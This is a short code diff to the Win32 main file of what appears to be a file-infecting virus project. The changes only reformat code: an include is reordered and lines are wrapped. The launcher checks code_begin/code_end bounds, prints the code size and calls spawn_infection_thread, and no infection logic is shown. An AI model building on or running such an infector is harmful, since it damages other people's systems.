@@ -3,15 +3,16 @@
 
 #include "code_begin.h"
 #include "code_end.h"
-#include "utility.h"
 #include "infection_thread.h"
+#include "utility.h"
 
 #ifdef _WIN64
 #error "Currently only support Win32"
 #endif
 
 int main(int argc, char **argv) {
-    assert(IS_32_BIT);    // currently only 32 bit working, yet need to check for 64 bit compatibility/differences
+    assert(IS_32_BIT); // currently only 32 bit working, yet need to check for
+                       // 64 bit compatibility/differences
     assert(IS_32_BIT ^ IS_64_BIT);
     assert(code_begin < code_end);
     ASSERT_FUNCTION_IN_BOUNDARIES(spawn_infection_thread)
@@ -23,7 +24,8 @@ int main(int argc, char **argv) {
     }
     printf("code_begin = 0x%p\n", code_begin);
     printf("code_end = 0x%p\n", code_end);
-    printf("code_size = 0x%X\n", (uint32_t)((uint8_t*)code_end - (uint8_t*)code_begin));
+    printf("code_size = 0x%X\n",
+           (uint32_t)((uint8_t *)code_end - (uint8_t *)code_begin));
     spawn_infection_thread();
     system("pause");
     return 0;
